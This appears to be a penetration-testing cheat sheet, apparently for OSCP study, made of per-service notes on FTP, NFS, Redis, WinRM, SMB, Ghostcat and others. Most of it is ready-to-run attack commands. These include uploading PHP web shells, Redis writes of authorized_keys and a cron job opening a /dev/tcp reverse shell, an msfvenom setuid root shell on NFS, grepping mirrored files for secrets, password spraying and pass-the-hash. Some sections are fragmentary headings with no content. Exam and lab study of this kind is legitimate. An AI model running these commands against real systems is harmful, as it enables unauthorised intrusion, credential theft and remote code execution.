docs.title: Service Usage
docs.text:
AJP is a binary protocol — no plaintext client. Interact via Ghostcat PoC scripts. Download the canonical ajpShooter PoC

wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py

docs.title: 0. Fast Path (try these first)
docs.text:
Confirm AJP is open

nmap -p 8009 -sV $ip

Check for Ghostcat (file read via AJP)

python3 ajpShooter.py http://$ip:8080 8009 /WEB-INF/web.xml read

Syntax: ajpShooter.py <url> <ajp_port> <file> <read|eval>. url = Tomcat's HTTP URL, 8009 = AJP port, read mode prints the file.

docs.title: Common gotchas
docs.text:
- Vulnerable Tomcat: < 9.0.31, < 8.5.51, < 7.0.100 (patched versions enforce requiredSecret).
- Ghostcat = local file read (LFI), NOT direct remote file include (RFI). RCE needs an upload primitive.
- Use eval mode only if you already uploaded a JSP-as-other-extension file.
- The `url` arg is Tomcat's HTTP port (e.g., 8080), NOT the AJP port. AJP port is the separate arg.
- Note: other ghostcat.py PoCs exist with DIFFERENT syntax — ajpShooter.py is the canonical/reference one.
- AJP is Tomcat's hidden backdoor — if 8009 is open, this is likely the intended path.

docs.title: Record Types
docs.text:
- NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
- A: Also known as a host record, the "a record" contains the IPv4 address of a hostname.
- AAAA: Also known as a quad A host record, the "aaaa record" contains the IPv6 address of a hostname.
- MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
- PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
- CNAME: Canonical Name Records are used to create aliases for other host records.
- TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.

docs.title: Common gotchas
docs.text:
- AXFR blocked? Try each NS record + the authoritative nameserver IPs directly.
- dig returns "connection timed out"? DNS may be TCP-only or behind firewall — try dig +tcp.
- version.bind often disabled — don't burn time on it.
- Subdomain brute is slow — start small wordlist, only grow if needed.

docs.title: Service Usage
docs.text:
Basic login

ftp $ip

lftp -u $un,$pw $ip

Standard Commands

PWD
LIST -la         # LIST -a surfaces dotfiles; many clients omit -a by default
NLST             # bare names only — sometimes allowed where LIST is filtered
STAT .           # same listing, control channel only
CWD /incoming    # enumerate common dirs by hand: /pub /upload /incoming /files /backup /www /home
CDUP
get

docs.title: 0. Fast Path (try these first)
docs.text:
Credential reuse: if you have creds from another service (SMB, HTTP, etc.), try them on FTP before reaching for Hydra.

Test anonymous login across all common variants in one pass:

for u in anonymous ftp; do
  echo -e "USER $u\r\nPASS $u@\r\nQUIT\r" | timeout 5 nc $ip 21
done

Passive mode fix (use if listings hang / "425 Can't open data connection"):

lftp -u $un,$pw -e "set ftp:passive-mode on; ls; bye" $ip

docs.title: 1. Banner Grab & Unauthenticated Enumeration
docs.text:
netcat grab

nc -nv $ip 21

netcat grab with timeout

timeout 5 nc $ip 21

If SSL/TLS is enabled on this port (implicit/explicit ftps - implicit is normally on 990)

openssl s_client -connect $ip:21 -starttls ftp

curl - Works but noisy

curl -v ftp://$ip:21/ 2>&1 | head -n 5

Anonymous login: anonymous:anonymous

curl -s --max-time 8 ftp://anonymous:anonymous@$ip/

Will report if root is writable

nmap -p 21 --script ftp-anon $ip

Enumerate FTP features

nmap -p 21 --script ftp-features $ip

enumerate common directories

gobuster dir -u ftp://$ip -w pslist.txt

All NSE scripts

nmap -p21 -sV --script "*ftp*" $ip

docs.title: 2. Authenticated Enumeration
docs.text:
Login over TLS (if plaintext refused or FTPS detected):

# Explicit FTPS (AUTH TLS)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; ls; bye" $ip
# Implicit FTPS (port 990 or given port)
lftp -u $un,$pw -e "set ftp:ssl-force true; set ftp:ssl-protect-data true; open ftps://$ip:990; ls; bye"

docs.title: Basic commands on signed in
docs.text:
MKD .testdir                -> 257 = create allowed
CWD .testdir
STOR probe.txt              -> 150/226 = upload allowed  (use a harmless name)
APPE probe.txt              -> append allowed
SITE CHMOD 777 probe.txt    -> 200 = permission control
SIZE probe.txt              -> confirms it landed
DELE probe.txt              -> cleanup
RMD .testdir

ALWAYS list with -a — dotfiles (.htaccess, .bash_history, .ssh/, backups) are the highest-yield FTP find.

Pull and grep

lftp -u anonymous,anonymous@ $IP -e "set ftp:ssl-allow no; mirror --parallel=2 / ./ftp_loot; bye"
grep -riE 'pass|pwd|user|key|token|secret' ftp_loot/

Single-file pull

curl -s ftp://$un:$pw@$ip/path/to/file -o file

wget fallback recursion (if mirror is blocked)

wget -r --ftp-user=$un --ftp-password=$pw ftp://$ip/

ProFTPD mod_copy — copy arbitrary server file to a readable location:

SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
GET passwd.txt

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
Last resort — try anon + known creds first, brute force is usually a time sink.

Spray to test passwords

hydra -L users.txt -p 'Spring2026!' -t 4 -W 3 -o spray_pass1.txt ftp://$ip

f to exit on hit

hydra -L users.txt -p pass.txt -f -t 4 -W 3 -o spray_pass1.txt ftp://$ip

Null/same-as-user/reversed logins (cheap first pass)

hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip

docs.title: 5. Quick Wins
docs.text:
TYPE I

TYPE I                     # <-- BEFORE upload. non-negotiable.
CWD /var/www/html
STOR s.php
SITE CHMOD 755 s.php

Verify the shell landed (don't assume CHMOD worked):

curl -s http://$ip/s.php

If SITE CHMOD returned 200 earlier, perms are controllable; otherwise many servers already write files executable. Always confirm mapping first:

PWD              # note landing dir — does it map to a web root?

docs.text:
Once you have a login, the goal is almost always: find file upload, command injection, or a known CVE. Confirm the login page tech/headers

curl -s -I http://$ip/login.php

Fingerprint the login page stack

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
App-level brute force is common but slow. Spray before brute, and always check for rate limiting. Spray a single password across users (POST form)

hydra -L users.txt -p 'Spring2026!' $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4

Brute force with a password list (POST form)

hydra -L users.txt -P pass.txt $ip http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4

docs.title: 5.2 File upload → web shell
docs.text:

curl -X POST -F "file=@shell.php" http://$ip/upload.php
curl -s http://$ip/uploads/shell.php?cmd=id

curl -s --data "cmd=;id" http://$ip/exec.php

docs.title: 7. Post-Exploit / Pivot
docs.text:
• Web shell → interactive shell (see Linux/Windows PrivEsc notes)
  • DB creds found → MySQL/PostgreSQL notes
  • Internal-only app → port forward/proxychains to reach it
  • Tomcat/Jenkins → WAR/JAR deployment for RCE

docs.title: Common gotchas
docs.text:
- Self-signed cert? curl -k or set insecure. Browsers block — use curl/burp.
- 403 on dir brute? Check for virtual host (Host header) or add -mc 403 to see them.
- .php .bak .old .txt .sql — always add extension list; source disclosure is huge.
- Upload dir non-executable? Look for .phtml/.php5 or bypass content-type/magic bytes.
- rate limiting? Slow hydra with -t 2 and add delay. Spray (one pass, many users) > brute (many passes, one user).

docs.title: Common gotchas

- Clock must be within ~5 min of the DC or you'll get KRB_AP_ERR_SKEW. Sync it.
- Kerberoast needs a domain user; AS-REP roast works with zero creds if pre-auth is off.
- Kerberos on OSCP = optional bonus. If you see 88 but no AD context, don't rabbit-hole.

docs.title: 2. Authenticated Enumeration
docs.text:
NFS usually has no per-user auth — the exports are the boundary. "Auth" = what you can read/write once mounted. Mount a specific export

mount -t nfs -o nolock $ip:/path /mnt/nfs

Find files matching sensitive keywords

find /mnt/nfs -type f 2>/dev/null | grep -iE 'pass|key|cred|config|ssh'

List all files recursively

ls -laR /mnt/nfs

docs.text: N/A for NFS itself — no password auth. Skip this section.

docs.title: 5.1 Read everything — SSH keys often live in exported /home
docs.text:
mount -t nfs $ip:/home /mnt/nfs
cat /mnt/nfs/*/.ssh/id_rsa        # → then ssh -i
cat /mnt/nfs/*/.bash_history

docs.title: 5.2 no_root_squash → write a setuid binary as root
docs.text:
# If the export has no_root_squash, write a setuid-root shell, chmod +s as root, run on target
msfvenom -p linux/x86/exec CMD="/bin/sh" -f elf -o /mnt/nfs/pwn
chmod +s /mnt/nfs/pwn
# execute on target: /mnt/nfs/pwn

(msfvenom here is only a payload generator, not a framework — commonly accepted. If your policy bars it, write a C setuid shell instead.)

docs.title: 5.3 World-writable export → overwrite a config/script that root runs
docs.text: ls -la /mnt/nfs        # find world-writable, then plant authorized_keys, cron, etc.

docs.title: Common gotchas
docs.text:
- "no_root_squash" = your root maps to target root (write setuid binaries).
- Mount fails? Use -o nolock, and make sure rpcbind (111) is reachable too.
- Read-only exports still leak creds/configs — don't skip them.
- NFS over UDP may need -o udp on old targets.

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
Redis auth is a single password, not per-user. Try defaults first (foobared is the shipped example). Test the default password

redis-cli -h $ip -a foobared ping

Brute force with hydra

hydra -P pass.txt $ip redis

Brute force with nxc

nxc redis $ip -p 6379 --pass-file pass.txt

docs.title: 5.1 No auth → RCE via modifying config (write SSH key or cron)
docs.text:
# Write SSH key (if we know a valid user + their home)
ssh-keygen -t rsa -f mykey -N ''
echo -e "\n\n$(cat mykey.pub)\n\n" > payload
redis-cli -h $ip set dump "$(cat payload)"
redis-cli -h $ip config set dir /root/.ssh/
redis-cli -h $ip config set dbfilename authorized_keys
redis-cli -h $ip save
ssh -i mykey root@$ip

docs.title: 5.2 RCE via cron (root Redis on Linux)
docs.text:
redis-cli -h $ip set cron '*/1 * * * * bash -i >& /dev/tcp/$myip/4444 0>&1'
redis-cli -h $ip config set dir /var/spool/cron/
redis-cli -h $ip config set dbfilename root
redis-cli -h $ip save

docs.title: 5.3 RCE via web shell (if a web root is reachable)
docs.text:
redis-cli -h $ip set shell '<?php system($_GET["cmd"]); ?>'
redis-cli -h $ip config set dir /var/www/html/
redis-cli -h $ip config set dbfilename shell.php
redis-cli -h $ip save
curl -s "http://$ip/shell.php?cmd=id"

docs.text:
• Redis RCE → root (if Redis runs as root)
  • Dump keys → find cached creds/session data

docs.title: Common gotchas
docs.text:
- Default config = no auth, but often binds to localhost only. If port shows open externally, you're likely in.
- If `bind 127.0.0.1` but you're on the box, localhost Redis is still a privesc vector.
- CONFIG SET requires the Redis process to have write perms to the target dir.
- Redis 6+ may need a username (AUTH default $pw) if ACL is configured — default user is "default".
- `foobared` is the example password left in many default configs.

docs.title: Common gotchas
docs.text:
- 445 closed but 139 open? Try SMB1 via -p 139 / add 'client max protocol = SMB2' to smb.conf if modern target refuses SMB1.
- "NT_STATUS_LOGON_FAILURE" on a correct-looking pw? Try WORKGROUP vs domain, or add -d . for local auth.
- SMB signing disabled/required: 'nmap --script smb2-security-mode' reveals it — relay attacks need signing disabled.
- Kerberos vs NTLM: if clock skew / "KRB_AP_ERR_SKEW", check target timezone/drift.

docs.title: Command map (moved psexec/wmiexec here for context)
docs.text:
impacket-psexec  -> interactive SYSTEM shell (needs admin, port 445)
impacket-wmiexec -> shell over WMI (port 135/5985, quieter than psexec)
impacket-smbexec -> semi-interactive, uses SMB only
netexec          -> enumeration + creds + --exec-method smbexec/atexec for command exec

docs.title: Service Usage
docs.text:
Connect manually (control channel)

nc -nv $ip 25

With SSL

openssl s_client -connect $ip:25 -starttls smtp -crlf
openssl s_client -connect $ip:465 -crlf

Standard Commands (inside the session)

EHLO $domain        # extended hello — lists supported commands (preferred over HELO)
HELO $domain        # basic hello
VRFY $user          # verify if $user exists (often disabled)
EXPN $list          # expand mailing list / alias (often disabled)
MAIL FROM:<$me>     # begin transaction
RCPT TO:<$user>     # recipient check — 250 = exists, 550 = no such user (best enum trick)
DATA                # begin message body
QUIT

Use nmap script library

nmap --script-help smtp-*

docs.title: Post-Enumeration
docs.text:
• Harvested usernames → spray across SSH/SMB/WinRM/HTTP (see those notes)
  • Valid mailbox creds + POP3/IMAP open → read mail for further creds

docs.title: Common gotchas
docs.text:
- VRFY/EXPN disabled? Use RCPT TO — it's the reliable fallback and nearly always tells you 250 vs 550.
- Responses vary: 250/251/252 = exists, 550/551/553 = no such user, 450 = graylisting/temp.
- EHLO may need the correct domain — try $ip, localhost, or the actual target domain if EHLO is rejected.
- STARTTLS on 25 vs implicit TLS on 465 — get the port right or you'll get no banner.
- smtp-user-enum needs valid FROM — if it errors, add the target domain or use any legit-looking sender.

- Only v2c/v1 typically. v3 needs auth/priv creds (rare on OSCP).
- Public (read-only) is enough to win — write community (private) is a bonus, not required.
- onesixtyone is much faster than snmpwalk for brute — use it first.
- onesixtyone -c <file> $ip works, but for many hosts use -i targets.txt.

- Strict host key warnings on repeat? Use -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null.
- SSH brute = last resort; it's the noisiest and slowest thing you can do.

docs.text:
• Device creds → try same creds on other services
  • Config dump → find internal IPs, SNMP strings, other creds

docs.title: Common gotchas
docs.text:
- Telnet = plaintext; creds sniffable if you're MITM (rare on OSCP).
- Network devices (routers/switches) are the main telnet targets on exams.
- No encryption — don't expect SSH-like behaviour.

docs.title: Common gotchas
docs.text:
- UDP-based (69) and tiny blocks — use -c carefully; large transfers fail.
- No directory listing — you must know/guess filenames. Use wordlists of common device config names.

docs.title: Common gotchas
docs.text:
- Display N = port 5900+N. Display :0 = 5900, :1 = 5901.
- 5800 is HTTP (web VNC) on some old setups.
- VNC auth may not log failures — brute carefully.

docs.text:
Auth check (cleanest signal, prints Pwn3d! on success)

nxc winrm $ip -u $un -p $pw

Run a single cmd command without a full shell

nxc winrm $ip -u $un -p $pw -x 'whoami'

Run a single PowerShell command

nxc winrm $ip -u $un -p $pw -X 'whoami'

Open an interactive shell

evil-winrm -i $ip -u $un -p $pw

Check current privileges

List local users

List local Administrators group

Upload a file to the target

Download a file from the target

docs.title: 3. Password Spraying / Bruteforcing
docs.text:
Highly relevant — WinRM is one of the best spraying targets (fast, low-noise). Spray a known password across users

nxc winrm $ip -u users.txt -p 'Spring2026!' --continue-on-success

Spray across hosts with one admin credential

nxc winrm targets.txt -u Administrator -p 'Passw0rd!' --continue-on-success

Brute force with hydra

hydra -L users.txt -P pass.txt winrm://$ip

docs.text: evil-winrm -i $ip -u $un -p $pw

docs.title: 5.2 Pass-the-hash (if you have NTLM hash, no plaintext)
docs.text: evil-winrm -i $ip -u $un -H $hash

docs.title: 5.3 Check auth without logging in (clean spray signal)
docs.text: nxc winrm $ip -u $un -p $pw

docs.title: 5.4 Forced auth / delegation (rare on OSCP, note for AD)
docs.text:
# WinRM requires users in "Remote Management Users" or local admins
net localgroup "Remote Management Users"

docs.title: 6. Config Paths
docs.text:
WinRM service config

winrm get winrm/config
winrm get winrm/config/service

Registry (override for port/auth)

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WS-Management\Service

Config quick-reference:

AllowUnencrypted -> if true, 5985 accepts plaintext (default)
Auth -> Basic/Kerberos/Negotiate flags

docs.title: 7. Post-Exploit / Pivot
docs.text:
• WinRM shell → PrivEsc (see Windows PrivEsc notes)
  • Same creds → SMB/RDP notes for other boxes
  • Pass-the-hash → lateral movement across the set

docs.title: Common gotchas
docs.text:
- WinRM only works for admin / "Remote Management Users" members. Non-admin usually denied.
- 5985 = HTTP, 5986 = HTTPS. evil-winrm defaults to 5985.
- "The network path was not found" / connection refused = WinRM off, or firewall.
- Kerberos clock skew on AD sets — sync if SPN errors.
- If SMB (445) is closed, add -d DOMAIN to nxc to force WinRM-only auth (avoids SMB dependency).
